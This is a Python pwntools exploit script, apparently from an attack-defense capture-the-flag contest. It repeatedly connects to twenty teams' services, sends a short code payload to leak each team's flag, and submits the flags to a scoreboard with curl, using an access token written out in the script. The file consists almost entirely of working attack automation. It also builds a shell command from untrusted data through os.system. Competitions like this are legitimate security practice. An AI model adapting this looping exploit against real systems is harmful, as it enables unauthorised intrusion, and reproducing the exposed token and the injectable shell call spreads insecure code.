import sys
from random import randrange
from pwn import *

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            con = remote('172.30.%d.13' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                con.close()
                continue

            loc = randrange(0, 0x300-4)
            con.recvuntil('size > ')
            con.sendline('4')
            con.recvuntil('code > ')
            con.sendline('\x4e\xf8' + p16(loc, endian='big'))
            con.recvuntil('loc > ')
            con.sendline(str(loc))
            con.recvuntil('[+] Run complete')
            flag = con.recvall(timeout=context.timeout).strip()
            con.close()
            if len(flag) > 0:
                submit_flag(team, flag)
        except Exception as e:
            print e

    sleep(15)
